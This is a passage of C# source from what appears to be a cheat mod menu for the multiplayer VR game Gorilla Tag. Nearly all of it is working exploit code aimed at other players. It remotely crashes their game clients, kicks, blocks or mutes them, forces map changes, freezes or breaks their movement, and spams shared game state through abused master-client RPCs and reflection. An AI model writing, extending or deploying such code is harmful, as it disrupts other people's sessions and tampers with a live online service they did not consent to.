                    target.position + target.right * 0.07f + target.up * -0.42f,
                    target.position + target.right * -0.07f + target.up * -0.42f,
                    target.position + target.forward * 0.07f + target.up * -0.42f,
                    target.position + target.forward * -0.07f + target.up * -0.42f
                });
            }, new GunLibrary.GunSettings { locks = true });
        }

        /// <summary>
        /// Sends every monster at whoever your hand desires, freezing or instantly dropping them.
        /// Uses the monsters' replacement state, which only works on players inside the maze.
        /// </summary>
        public static void MonsterReplaceGun(VRRig target, bool freeze)
        {
            if (!Networking.IsMasterClient)
            {
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
                return;
            }

            if (!InOGBasement())
            {
                Notifications.SendFormat("red", "ERROR", "You must be in the OG basement.");
                return;
            }

            if (target.scaleFactor != 0.03f)
            {
                Notifications.SendFormat("red", "ERROR", "This player must be in the maze.");
                return;
            }

            foreach (MonkeyeAI monster in GetAllType<MonkeyeAI>())
            {
                Vector3 originalPosition = monster.transform.position;
                monster.transform.position = target.transform.position;
                monster.SetState((MonkeyeAI_ReplState.EStates)5);
                monster.replState.userId = Players.GetPlayerFromVRRig(target).UserId;
                monster.replState.timer = freeze ? 1f : 0.01f;
                monster.replState.freezePlayer = freeze;
                monster.replState.floorEnabled = freeze;
                monster.replState.attackPos = target.transform.position;
                typeof(MonkeyeAI).GetField("targetRig", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Public)?.SetValue(monster, target);

                if (!freeze)
                    monster.transform.position = originalPosition;
            }
        }

        public static void MonsterBreakMovementGun() =>
            GunLibrary.Target(gunTarget => MonsterReplaceGun(gunTarget, true), new GunLibrary.GunSettings { locks = true });

        public static void DropPlayerGun() =>
            GunLibrary.Target(gunTarget => MonsterReplaceGun(gunTarget, false), new GunLibrary.GunSettings { locks = true });

        #endregion

        public static void VIMKickGun()
        {
            if (!References.LocalRig.IsVIMSubscriber())
            {
                PromptSingle("You are not a VIM subscriber, so this mod will not function.");
                Manager.GetIndex("VIM Kick Gun").SetEnabled(false);
                return;
            }
            GunLibrary.Target(gunTarget =>
            {
                RoomControls.KickPlayer(gunTarget.GetPlayer().ActorNumber);
            });
        }

        public static void VIMKickAll()
        {
            if (!References.LocalRig.IsVIMSubscriber())
            {
                PromptSingle("You are not a VIM subscriber, so this mod will not function.");
                return;
            }
            ManagerRegistry.NetworkSystem.PlayerListOthers.ForEach(p => RoomControls.KickPlayer(p.ActorNumber));
        }

        public static void VIMBlockGun()
        {
            if (!References.LocalRig.IsVIMSubscriber())
            {
                PromptSingle("You are not a VIM subscriber, so this mod will not function.");
                Manager.GetIndex("VIM Block Gun").SetEnabled(false);
                return;
            }
            GunLibrary.Target(gunTarget =>
            {
                RoomControls.KickAndBlockPlayer(gunTarget.GetPlayer().ActorNumber);
            });
        }

        public static void VIMBlockAll()
        {
            if (!References.LocalRig.IsVIMSubscriber())
            {
                PromptSingle("You are not a VIM subscriber, so this mod will not function.");
                return;
            }
            ManagerRegistry.NetworkSystem.PlayerListOthers.ForEach(p => RoomControls.KickAndBlockPlayer(p.ActorNumber));
        }

        public static void VIMMuteGun()
        {
            if (!References.LocalRig.IsVIMSubscriber())
            {
                PromptSingle("You are not a VIM subscriber, so this mod will not function.");
                Manager.GetIndex("VIM Mute Gun").SetEnabled(false);
                return;
            }
            GunLibrary.Aim(GunData =>
            {
                RaycastHit Ray = GunData.Ray;

                if (gunLocked && lockTarget != null && !RoomControls.MutedPlayers.ContainsKey(lockTarget.GetPlayer().UserId))
                    RoomControls.MutePlayer(lockTarget.GetPlayer().ActorNumber);
                if (GetGunInput(true))
                {
                    VRRig gunTarget = Ray.collider.GetComponentInParent<VRRig>();
                    if (gunTarget && !gunTarget.IsLocal() && !gunTarget.IsTagged())
                    {
                        if (PhotonNetwork.IsMasterClient)
                        {
                            gunLocked = true;
                            lockTarget = gunTarget;
                        }
                    }
                }
            }, new GunLibrary.GunSettings
            {
                onIdle = () =>
                {
                    if (gunLocked)
                        gunLocked = false;
                }
            });
        }

        public static void VIMMuteAll()
        {
            if (!References.LocalRig.IsVIMSubscriber())
            {
                PromptSingle("You are not a VIM subscriber, so this mod will not function.");
                return;
            }
            ManagerRegistry.NetworkSystem.PlayerListOthers.ForEach(p => RoomControls.MutePlayer(p.ActorNumber));
        }
        public static void VIMUnmuteAll() =>
            ManagerRegistry.NetworkSystem.PlayerListOthers.ForEach(p => RoomControls.UnmutePlayer(p.UserId));

        public static void GuardianSelf() =>
            GameModes.SetGuardian(PhotonNetwork.LocalPlayer);
        public static void GuardianGun()
        {
            GunLibrary.Target(gunTarget =>
            {
                GameModes.SetGuardian(GetPlayerFromVRRig(gunTarget));
                Overpowered.guardianDelay = Time.time + 0.1f;
            }, new GunLibrary.GunSettings { when = () => Time.time > Overpowered.guardianDelay });
        }

        public static void GuardianAll()
        {
            if (Networking.IsMasterClient)
            {
                int i = 0;
                foreach (var gorillaGuardianZoneManager in GorillaGuardianZoneManager.zoneManagers.Where(gorillaGuardianZoneManager => gorillaGuardianZoneManager.enabled && gorillaGuardianZoneManager.IsZoneValid()))
                {
                    gorillaGuardianZoneManager.SetGuardian(PhotonNetwork.PlayerList[i]);
                    i++;
                }
            }
            else Notifications.SendFormat("red", "ERROR", "You are not master client.");
        }

        public static void UnguardianSelf()
        {
            if (Networking.IsMasterClient)
            {
                foreach (var gorillaGuardianZoneManager in GorillaGuardianZoneManager.zoneManagers.Where(gorillaGuardianZoneManager => gorillaGuardianZoneManager.enabled && gorillaGuardianZoneManager.IsZoneValid()).Where(gorillaGuardianZoneManager => gorillaGuardianZoneManager.CurrentGuardian == Networking.LocalPlayer))
                    gorillaGuardianZoneManager.SetGuardian(null);
            }
            else Notifications.SendFormat("red", "ERROR", "You are not master client.");
        }

        public static void UnguardianGun()
        {
            GunLibrary.Target(gunTarget =>
            {
                if (Networking.IsMasterClient)
                {
                    foreach (var gorillaGuardianZoneManager in GorillaGuardianZoneManager.zoneManagers.Where(gorillaGuardianZoneManager => gorillaGuardianZoneManager.enabled && gorillaGuardianZoneManager.IsZoneValid()).Where(gorillaGuardianZoneManager => gorillaGuardianZoneManager.CurrentGuardian == GetPlayerFromVRRig(gunTarget)))
                        gorillaGuardianZoneManager.SetGuardian(null);
                }
                else Notifications.SendFormat("red", "ERROR", "You are not master client.");
                Overpowered.guardianDelay = Time.time + 0.1f;
            }, new GunLibrary.GunSettings { when = () => Time.time > Overpowered.guardianDelay });
        }

        public static void UnguardianAll()
        {
            if (Networking.IsMasterClient)
            {
                foreach (var gorillaGuardianZoneManager in GorillaGuardianZoneManager.zoneManagers.Where(gorillaGuardianZoneManager => gorillaGuardianZoneManager.enabled && gorillaGuardianZoneManager.IsZoneValid()))
                    gorillaGuardianZoneManager.SetGuardian(null);
            }
            else Notifications.SendFormat("red", "ERROR", "You are not master client.");
        }
        public static void MaterialTarget(VRRig rig)
        {
            if (!Networking.IsMasterClient)
            {
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
                return;
            }

            NetPlayer player = rig.GetPlayer();
            Overpowered.materialState.TryGetValue(rig, out var state);

            state++;
            state %= 6;

            if (ManagerRegistry.GorillaGameManager.GameType() == GameModeType.Casual)
            {
                if (state < 4)
                    state = 4;
            }

            Overpowered.materialState[rig] = state;

            switch (state)
            {
                case 0:
                    AddInfected(player);
                    break;
                case 1:
                    RemoveInfected(player);
                    break;
                case 2:
                    AddRock(player);
                    break;
                case 3:
                    RemoveRock(player);
                    break;
                case 4:
                    GameModes.SetMonkeBallTeams(new Dictionary<int, int> { { player.ActorNumber, 0 } });
                    break;
                case 5:
                    GameModes.SetMonkeBallTeams(new Dictionary<int, int> { { player.ActorNumber, 1 } });
                    break;
            }
        }

        public static void MaterialGun()
        {
            GunLibrary.Aim(GunData =>
            {
                RaycastHit Ray = GunData.Ray;

                if (gunLocked && lockTarget != null)
                {
                    if (!Networking.IsMasterClient)
                        Notifications.SendFormat("red", "ERROR", "You are not master client.");
                    else
                    {
                        if (Time.time > materialDelay)
                        {
                            materialDelay = Time.time + 0.1f;
                            MaterialTarget(lockTarget);
                        }
                    }
                }
                if (GetGunInput(true))
                {
                    VRRig gunTarget = Ray.collider.GetComponentInParent<VRRig>();
                    if (gunTarget && !gunTarget.IsLocal() && !gunTarget.IsTagged())
                    {
                        if (PhotonNetwork.IsMasterClient)
                        {
                            gunLocked = true;
                            lockTarget = gunTarget;
                        }
                    }
                }
            }, new GunLibrary.GunSettings
            {
                onIdle = () =>
                {
                    if (gunLocked)
                        gunLocked = false;
                }
            });
        }

        public static void MaterialAll()
        {
            if (Time.time > materialDelay)
            {
                materialDelay = Time.time + 0.1f;
                foreach (VRRig rig in Players.ActiveRigs)
                    MaterialTarget(rig);
            }
        }
        public static void GuardianSpaz()
        {
            if (Time.time > Overpowered.guardianSpazDelay)
            {
                Overpowered.guardianSpazDelay = Time.time + 0.1f;
                Overpowered.guardianSpazToggle = !Overpowered.guardianSpazToggle;
                if (Overpowered.guardianSpazToggle)
                    GuardianAll();
                else
                    UnguardianAll();
            }
        }

        public static void DriverStatus(bool locked)
        {
            if (PhotonNetwork.IsMasterClient)
                ManagerRegistry.VirtualStumpSerializer.SendRPC("SetTerminalControlStatus_RPC", true, locked, PhotonNetwork.LocalPlayer.ActorNumber);
            else
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
        }
        public static void SpazDriver()
        {
            if (PhotonNetwork.IsMasterClient)
            {
                if (Time.time > Overpowered.spazDriverDelay)
                {
                    Overpowered.spazDriverDelay = Time.time + 0.1f;
                    ManagerRegistry.VirtualStumpSerializer.SendRPC("SetTerminalControlStatus_RPC", true, true, PhotonNetwork.LocalPlayer.ActorNumber);
                    ManagerRegistry.VirtualStumpSerializer.SendRPC("SetTerminalControlStatus_RPC", true, false, PhotonNetwork.LocalPlayer.ActorNumber);
                }
            }
        }

        public static void DriverStatusGun(bool locked)
        {
            GunLibrary.Target(lockTarget =>
            {
                if (PhotonNetwork.IsMasterClient)
                    ManagerRegistry.VirtualStumpSerializer.SendRPC("SetTerminalControlStatus_RPC", true, locked, lockTarget.GetPlayer().ActorNumber);
            }, new GunLibrary.GunSettings { locks = true });
        }

        public static void SpazDriverStatusGun()
        {
            GunLibrary.Target(lockTarget =>
            {
                if (PhotonNetwork.IsMasterClient)
                {
                    if (Time.time > Overpowered.spazDriverDelay)
                    {
                        Overpowered.spazDriverDelay = Time.time + 0.1f;
                        ManagerRegistry.VirtualStumpSerializer.SendRPC("SetTerminalControlStatus_RPC", true, true, lockTarget.GetPlayer().ActorNumber);
                        ManagerRegistry.VirtualStumpSerializer.SendRPC("SetTerminalControlStatus_RPC", true, false, lockTarget.GetPlayer().ActorNumber);
                    }
                }
            }, new GunLibrary.GunSettings { locks = true });
        }
        public static void VirtualStumpKickGun()
        {
            if (!Networking.InRoom)
            {
                Overpowered.id = null;
                return;
            }

            if (!PhotonNetwork.IsMasterClient)
            {
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
                Manager.GetIndex("Virtual Stump Kick Gun").SetEnabled(false);
                return;
            }

            if (Overpowered.id == null && Time.time > Overpowered.setMapDelay)
            {
                Overpowered.setMapDelay = Time.time + 1f;

                if (CustomMapsTerminal.GetDriverID() != PhotonNetwork.LocalPlayer.ActorNumber)
                {
                    Notifications.SendFormat("purple", "VSTUMP", "Gaining control of the terminal, please wait...");
                    Overpowered.BecomeDriver();
                    return;
                }

                if (CustomMapManager.IsRemotePlayerInVirtualStump(Networking.LocalPlayer.UserId))
                {
                    Overpowered.id = CustomMaps.Manager.currentMapId == 4977315 ? 5024157 : 4977315;

                    ManagerRegistry.VirtualStumpSerializer.photonView.RPC("UpdateScreen_RPC", lockTarget.GetPhotonPlayer(), new object[]
                    {
                        6,
                        Overpowered.id,
                        CustomMapsTerminal.GetDriverID()
                    });
                    Notifications.SendFormat("green", "SUCCESS", "You now have access to use the gun.");
                }
                else
                    Notifications.SendFormat("red", "ERROR", "Please temporarily enter the Virtual Stump.");
            }

            if (Overpowered.id != null)
            {
                GunLibrary.Target(gunTarget =>
                {
                    ManagerRegistry.VirtualStumpSerializer.photonView.RPC("SetRoomMap_RPC", lockTarget.GetPhotonPlayer(), Overpowered.id.Value);
                });
            }
        }

        public static void VirtualStumpKickAll()
        {
            if (!Networking.InRoom)
            {
                Overpowered.id = null;
                return;
            }

            if (!PhotonNetwork.IsMasterClient)
            {
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
                Toggle("Virtual Stump Kick All");
                return;
            }

            if (Overpowered.id == null && Time.time > Overpowered.setMapDelay)
            {
                Overpowered.setMapDelay = Time.time + 1f;

                if (CustomMapsTerminal.GetDriverID() != PhotonNetwork.LocalPlayer.ActorNumber)
                {
                    Notifications.SendFormat("purple", "INFO", "Gaining control of the terminal, please wait...");
                    Overpowered.BecomeDriver();
                    return;
                }

                if (CustomMapManager.IsRemotePlayerInVirtualStump(Networking.LocalPlayer.UserId))
                {
                    Overpowered.id = CustomMaps.Manager.currentMapId == 4977315 ? 5024157 : 4977315;

                    ManagerRegistry.VirtualStumpSerializer.photonView.RPC("UpdateScreen_RPC", RpcTarget.Others, new object[]
                    {
                        6,
                        Overpowered.id,
                        CustomMapsTerminal.GetDriverID()
                    });
                    Notifications.SendFormat("purple", "INFO", "Kicking...");
                }
                else
                    Notifications.SendFormat("red", "ERROR", "Please temporarily enter the Virtual Stump.");
            }

            ManagerRegistry.VirtualStumpSerializer.photonView.RPC("SetRoomMap_RPC", RpcTarget.Others, Overpowered.id.Value);

            Notifications.SendFormat("green", "SUCCESS", "Successfully kicked others.");
            Toggle("Virtual Stump Kick All");
        }

        public static void MasterVirtualStumpCrashGun()
        {
            GunLibrary.Target(lockTarget =>
            {
                GameEntities.GameEntityCrash(ManagerRegistry.CustomMaps.GameEntityManager, lockTarget.GetPhotonPlayer(), lockTarget.transform.position);
            }, new GunLibrary.GunSettings { locks = true });
        }

        public static void MasterVirtualStumpCrashAll() =>
            GameEntities.GameEntityCrash(ManagerRegistry.CustomMaps.GameEntityManager, RpcTarget.Others);

        public static void GhostReactorCrashGun()
        {
            GunLibrary.Target(lockTarget =>
            {
                GameEntities.GameEntityCrash(ManagerRegistry.GhostReactor.GameEntityManager, lockTarget.GetPhotonPlayer(), lockTarget.transform.position);
            }, new GunLibrary.GunSettings { locks = true });
        }

        public static void GhostReactorCrashAll() =>
            GameEntities.GameEntityCrash(ManagerRegistry.GhostReactor.GameEntityManager, RpcTarget.Others);

        public static void SuperInfectionCrashGun()
        {
            GunLibrary.Target(lockTarget =>
            {
                GameEntities.GameEntityCrash(ManagerRegistry.SuperInfection.GameEntityManager, lockTarget.GetPhotonPlayer(), lockTarget.transform.position);
            }, new GunLibrary.GunSettings { locks = true });
        }

        public static void SuperInfectionCrashAll() =>
            GameEntities.GameEntityCrash(ManagerRegistry.SuperInfection.GameEntityManager, RpcTarget.Others);

        public static void SuperInfectionBreakAudioGun()
        {
            GunLibrary.Target(lockTarget =>
            {
                GameEntities.CreateItem(lockTarget.GetPlayer(), Gadgets.GadgetByName["WristJetGadgetPropellor"], lockTarget.transform.position, RandomQuaternion(), Vector3.zero, Vector3.zero, 0L, ManagerRegistry.SuperInfection.GameEntityManager);
            }, new GunLibrary.GunSettings { locks = true });
        }

        public static void SuperInfectionBreakAudioAll() =>
            GameEntities.CreateItem(RpcTarget.Others, Gadgets.GadgetByName["WristJetGadgetPropellor"], References.BodyCollider.transform.position, RandomQuaternion(), Vector3.zero, Vector3.zero, 0L, ManagerRegistry.SuperInfection.GameEntityManager);
        public static void SpazPropHuntObjects()
        {
            if (Time.time > Overpowered.propHuntSpazDelay)
            {
                Overpowered.propHuntSpazDelay = Time.time + 0.1f;
                Overpowered.propHuntSpazMode = !Overpowered.propHuntSpazMode;

                if (!Networking.IsMasterClient) { Notifications.SendFormat("red", "ERROR", "You are not master client."); return; }

                if (Networking.InRoom && ManagerRegistry.GorillaGameManager.GameType() == GameModeType.PropHunt)
                {
                    GameModes.SetPropHuntRoundStart(Overpowered.propHuntSpazMode ? 1 : 2);
                    GameModes.RandomizePropHuntSeed();
                }
            }
        }

        public static void SpazPropHunt()
        {
            if (Time.time > Overpowered.propHuntSpazDelay)
            {
                Overpowered.propHuntSpazDelay = Time.time + 0.1f;
                Overpowered.propHuntSpazMode = !Overpowered.propHuntSpazMode;

                if (!Networking.IsMasterClient) { Notifications.SendFormat("red", "ERROR", "You are not master client."); return; }

                if (Networking.InRoom && ManagerRegistry.GorillaGameManager.GameType() == GameModeType.PropHunt)
                {
                    GameModes.SetPropHuntRoundStart(Overpowered.propHuntSpazMode ? 0 : 1);
                }
            }
        }
        public static void ActivateGreyZoneGun(bool status)
        {
            GunLibrary.Target(gunTarget =>
            {
                Overpowered.greyZoneDelay = Time.time + 0.1f;
                ActivateGreyZone(status, gunTarget.GetPhotonPlayer());
            }, new GunLibrary.GunSettings { when = () => Time.time > Overpowered.greyZoneDelay });
        }

        public static void ActivateGreyZone(bool status, Player target)
        {
            if (!Networking.IsMasterClient)
            {
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
                return;
            }

            ViewSerialization.OverrideSerialization = () =>
            {
                MassSerialize(true, new[] { ManagerRegistry.GreyZoneManager.photonView });
                ViewSerialization.OverrideSerialization = null;
                return false;
            };

            Overpowered.wipeOverride ??= Coroutines.instance.StartCoroutine(Overpowered.ClearOverride());

            ManagerRegistry.GreyZoneManager.greyZoneActive = status;
            ManagerRegistry.GreyZoneManager.photonConnectedDuringActivation = Networking.InRoom;
            ManagerRegistry.GreyZoneManager.greyZoneActivationTime = (ManagerRegistry.GreyZoneManager.photonConnectedDuringActivation ? PhotonNetwork.Time : ((double)Time.time));

            SendSerialize(ManagerRegistry.GreyZoneManager.photonView, new RaiseEventOptions { TargetActors = new[] { target.ActorNumber } });
        }

        public static void ActivateGreyZone(bool status)
        {
            if (Networking.InRoom)
            {
                if (!Networking.IsMasterClient)
                {
                    Notifications.SendFormat("red", "ERROR", "You are not master client.");
                    return;
                }

                if (status)
                {
                    ManagerRegistry.GreyZoneManager.ActivateGreyZoneAuthority();
                }

                else if (!status)
                    ManagerRegistry.GreyZoneManager.DeactivateGreyZoneAuthority();
            }
        }
        public static void SpazGreyZoneGun()
        {
            if (Time.time > Overpowered.spazGreyDelay)
            {
                Overpowered.greyState = !Overpowered.greyState;
                Overpowered.spazGreyDelay = Time.time + 0.1f;
            }

            ActivateGreyZoneGun(Overpowered.greyState);
        }

        public static void SpazGreyZone()
        {
            if (Time.time > Overpowered.spazGreyDelay)
            {
                Overpowered.greyState = !Overpowered.greyState;
                ActivateGreyZone(Overpowered.greyState);
                Overpowered.spazGreyDelay = Time.time + 0.1f;
            }
        }

        public static void ChangeLavaState(InfectionLavaController.RisingLavaState state)
        {
            InfectionLavaController controller = InfectionLavaController.ActiveControllers.FirstOrDefault();

            if (controller != null)
            {
                controller.JumpToState(state);
                controller.reliableState.stateStartTime = Networking.InRoom ? ManagerRegistry.NetworkSystem.SimTime : Time.timeAsDouble;
            }
        }

        public static bool spazLavaState;

        public static void SpazLava()
        {
            ChangeLavaState(spazLavaState ? InfectionLavaController.RisingLavaState.Full : InfectionLavaController.RisingLavaState.Drained);
            spazLavaState = !spazLavaState;
        }

        private static SharedBlocksTerminal GetTerminal() => GetAllType<SharedBlocksTerminal>().FirstOrDefault();

        public static void StealTerminal()
        {
            SharedBlocksTerminal terminal = GetTerminal();
            terminal?.SetTerminalDriver(PhotonNetwork.LocalPlayer.ActorNumber);
        }

        public static void LockTerminal()
        {
            SharedBlocksTerminal terminal = GetTerminal();
            terminal?.OnTerminalControlPressed();
        }

        public static void ClearTerminal()
        {
            SharedBlocksTerminal terminal = GetTerminal();
            terminal?.OnDeleteButtonPressed();
        }

        private static float terminalSpazDelay;
        public static void SpazTerminalMaps()
        {
            if (Time.time < terminalSpazDelay) return;
            terminalSpazDelay = Time.time + 0.025f;

            GetTerminal()?.OnRandomizeButtonPressed();
        }

        public static void SpazTerminalSearches()
        {
            if (Time.time < terminalSpazDelay) return;
            terminalSpazDelay = Time.time + 0.025f;

            GetTerminal()?.SelectMapIDAndOpenInfo("AAAAAAAA");
        }

        public static void TargetSpam()
        {
            if (Networking.IsMasterClient)
            {
                foreach (HitTargetNetworkState hitTargetNetworkState in GetAllType<HitTargetNetworkState>())
                {
                    hitTargetNetworkState.hitCooldownTime = 0;
                    hitTargetNetworkState.TargetHit(Vector3.zero, Vector3.zero);
                }
            }
            else Notifications.SendFormat("red", "ERROR", "You are not master client.");
        }

        #region Beach / Sports Scoreboard

        /// <summary>
        /// Sports scoreboard control. Team 0 is blue, team 1 is orange, team 2 resets.
        /// </summary>
        public static void BeachScore(int team)
        {
            if (!Networking.InRoom || Networking.IsMasterClient)
            {
                if (References.LocalRig.zoneEntity.currentZone == GTZone.beach)
                {
                    if (team == 2)
                        GorillaTag.Sports.SportScoreboard.Instance.ResetScores();
                    else
                        GorillaTag.Sports.SportScoreboard.Instance.TeamScored(team);
                }
                else
                    Notifications.SendFormat("red", "ERROR", "You must be in beach.");
            }
            else
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
        }

        private static float beachSpazDelay;
        public static void BeachScoreSpaz()
        {
            if (Time.time < beachSpazDelay) return;
            beachSpazDelay = Time.time + 0.1f;

            BeachScore(Random.Range(0, 3));
        }

        #endregion

        #region Fossil Hunt

        /// <summary>
        /// Fossil hunt deposit control. Sets the fossil count on the deposit in the fossil hunt map.
        /// </summary>
        public static void SetFossils(int value, string mode = null)
        {
            if (!Networking.IsMasterClient)
            {
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
                return;
            }

            if (References.LocalRig.zoneEntity.currentZone != GTZone.VIMExperience3)
            {
                Notifications.SendFormat("red", "ERROR", "You must be in the fossil hunt map.");
                return;
            }

            Voxels.VoxelSpawnableDeposit deposit = GetAllType<Voxels.VoxelSpawnableDeposit>().FirstOrDefault();
            if (deposit == null)
                return;

            GameEntity entity = deposit.GetComponent<GameEntity>();
            if (entity == null)
                return;

            long newState = mode switch
            {
                "Add 1" => entity.GetState() + 1,
                "Remove 1" => entity.GetState() - 1,
                "Spaz" => Random.Range(0, 100),
                _ => value
            };
            entity.RequestState(newState);
        }

        public static void FossilSpaz() => SetFossils(0, "Spaz");

        public static void BreakFossilHunt()
        {
            if (!Networking.IsMasterClient)
            {
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
                return;
            }

            foreach (Voxels.VoxelSpawnableDeposit deposit in GetAllType<Voxels.VoxelSpawnableDeposit>())
            {
                GameEntity entity = deposit.GetComponent<GameEntity>();
                entity?.RequestState(int.MinValue);
            }
        }

        #endregion

        #region Ranked

        /// <summary>
        /// Ranked control. Sets the ranked countdown threshold: 0.001e9 to break, 3 to fix, -67 to force start.
        /// </summary>
        public static void SetRankedThreshold(float value)
        {
            if (!Networking.InRoom || Networking.IsMasterClient)
            {
                if (ManagerRegistry.GorillaGameManager.GameType() == GameModeType.InfectionCompetitive || References.LocalRig.zoneEntity.currentZone == GTZone.ranked)
                {
                    GorillaTagManager tagManager = ManagerRegistry.GorillaTagManager;
                    if (value != -67f)
                        tagManager.infectedModeThreshold = (int)value;
                    else if (tagManager.isCurrentlyTag)
                        tagManager.infectedModeThreshold = 0;
                    else
                        Notifications.SendFormat("red", "ERROR", "Ranked is already started.");
                }
                else
                    Notifications.SendFormat("red", "ERROR", "You must be in a ranked lobby.");
            }
            else
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
        }

        private static float rankedSpazDelay;
        public static void SpazRankedCountdown()
        {
            if (Time.time < rankedSpazDelay) return;
            rankedSpazDelay = Time.time + 0.149f;

            SetRankedThreshold(Random.Range(3f, 1e9f));
        }

        #endregion

        #region Break Movement

        private const int BreakMovementEntityHash = 1517967647;

        private static bool InGhostReactor(VRRig rig) =>
            rig.zoneEntity.currentZone == GTZone.ghostReactor || rig.zoneEntity.currentZone == GTZone.ghostReactorDrill;

        /// <summary>
        /// Breaks the movement of a player by spawning the break movement entity on them.
        /// Locked to the ghost reactor map, where the game allows these entities.
        /// </summary>
        public static void BreakMovementPlayer(VRRig target)
        {
            if (!Networking.IsMasterClient)
            {
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
                return;
            }

            if (!InGhostReactor(target))
            {
                Notifications.SendFormat("red", "ERROR", "This player must be in ghost reactor.");
                return;
            }

            GameEntityManager manager = GameEntityManager.GetManagerForZone(target.zoneEntity.currentZone);
            if (manager == null)
                return;

            Qubit.Libraries.Entities.GameEntities.CreateItem(
                GetPlayerFromVRRig(target),
                BreakMovementEntityHash,
                target.transform.position,
                Quaternion.Euler(90f, 0f, 0f),
                Vector3.zero, Vector3.zero, manager: manager);
            Qubit.Core.Security.RPCProtection();
        }

        public static void BreakMovementGun()
        {
            GunLibrary.Target(gunTarget => BreakMovementPlayer(gunTarget), new GunLibrary.GunSettings { locks = true });
        }

        public static void BreakMovementAll()
        {
            if (!Networking.IsMasterClient)
            {
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
                return;
            }

            foreach (VRRig rig in Players.ActiveRigs.Where(rig => !rig.isLocal && InGhostReactor(rig)))
                BreakMovementPlayer(rig);
        }

        public static void BreakMovementAllExceptGun()
        {
            GunLibrary.Target(gunTarget =>
            {
                if (!Networking.IsMasterClient)
                {
                    Notifications.SendFormat("red", "ERROR", "You are not master client.");
                    return;
                }

                foreach (VRRig rig in Players.ActiveRigs.Where(rig => !rig.isLocal && rig != gunTarget && InGhostReactor(rig)))
                    BreakMovementPlayer(rig);
            }, new GunLibrary.GunSettings { locks = true });
        }

        /// <summary>
        /// Breaks the movement of whoever you touch.
        /// </summary>
        public static void BreakMovementTouch()
        {
            foreach (VRRig rig in Players.ActiveRigs.Where(rig => !rig.isLocal && InGhostReactor(rig)))
            {
                if (Vector3.Distance(References.LocalRig.rightHandTransform.position, rig.transform.position) < 0.35f ||
                    Vector3.Distance(References.LocalRig.leftHandTransform.position, rig.transform.position) < 0.35f)
                    BreakMovementPlayer(rig);
            }
        }

        /// <summary>
        /// Breaks the movement of whoever touches you.
        /// </summary>
        public static void BreakMovementOnTouch()
        {
            foreach (VRRig rig in Players.ActiveRigs.Where(rig => !rig.isLocal && InGhostReactor(rig)))
            {
                if (Vector3.Distance(rig.rightHandTransform.position, References.LocalRig.transform.position) < 0.35f ||
                    Vector3.Distance(rig.leftHandTransform.position, References.LocalRig.transform.position) < 0.35f)
                    BreakMovementPlayer(rig);
            }
        }

        /// <summary>
        /// Fixes everyone's movement by destroying all float and break movement entities. Requires master client.
        /// </summary>
        public static void FixMovementAll()
        {
            if (!Networking.IsMasterClient)
            {
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
                return;
            }

            GameEntityManager manager = GameEntityManager.GetManagerForZone(References.LocalRig.zoneEntity.currentZone);
            if (manager == null)
                return;

            List<int> netIds = new List<int>();
            foreach (GameEntity entity in manager.entities)
            {
                if (entity == null || (entity.typeId != FloatEntityHash && entity.typeId != BreakMovementEntityHash))
                    continue;

                entity.gameObject.SetActive(true);
                int netId = entity.GetNetId();
                if (!netIds.Contains(netId))
                    netIds.Add(netId);
            }

            if (netIds.Count > 0)
            {
                manager.photonView.RPC("DestroyItemRPC", RpcTarget.All, new object[] { netIds.ToArray() });
                Qubit.Core.Security.RPCProtection();
            }
        }

        private const int FloatEntityHash = 544609760;

        /// <summary>
        /// Give variants: the selected player triggers break movement on touch / on being touched.
        /// </summary>
        public static void GiveBreakMovementTouch(bool onTouch)
        {
            GunLibrary.Target(gunTarget =>
            {
                foreach (VRRig rig in Players.ActiveRigs.Where(rig => !rig.isLocal && rig != gunTarget && InGhostReactor(rig)))
                {
                    bool touching = onTouch
                        ? Vector3.Distance(rig.rightHandTransform.position, gunTarget.transform.position) < 0.31f || Vector3.Distance(rig.leftHandTransform.position, gunTarget.transform.position) < 0.31f
                        : Vector3.Distance(gunTarget.rightHandTransform.position, rig.transform.position) < 0.31f || Vector3.Distance(gunTarget.leftHandTransform.position, rig.transform.position) < 0.31f;

                    if (touching)
                        BreakMovementPlayer(rig);
                }
            }, new GunLibrary.GunSettings { locks = true });
        }

        public static void GiveBreakMovementTouchGun() => GiveBreakMovementTouch(false);
        public static void GiveBreakMovementOnTouchGun() => GiveBreakMovementTouch(true);

        #endregion

        #region Shooting Gallery Targets

        private static System.Reflection.FieldInfo targetScoreField;
        private static System.Reflection.FieldInfo targetCooldownField;

        private static GorillaTag.WatchableIntSO GetTargetScore(HitTargetNetworkState target)
        {
            targetScoreField ??= typeof(HitTargetNetworkState).GetField("scoreSO", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Public);
            return targetScoreField?.GetValue(target) as GorillaTag.WatchableIntSO;
        }

        private static float GetTargetCooldown(HitTargetNetworkState target)
        {
            targetCooldownField ??= typeof(HitTargetNetworkState).GetField("hitCooldownTime", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Public)
                ?? typeof(HitTargetNetworkState).GetField("nextHitTime", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Public);
            return targetCooldownField != null ? (float)targetCooldownField.GetValue(target) : 0f;
        }

        private static void SetTargetCooldown(HitTargetNetworkState target, float value)
        {
            targetCooldownField ??= typeof(HitTargetNetworkState).GetField("hitCooldownTime", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Public)
                ?? typeof(HitTargetNetworkState).GetField("nextHitTime", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Public);
            targetCooldownField?.SetValue(target, value);
        }

        /// <summary>
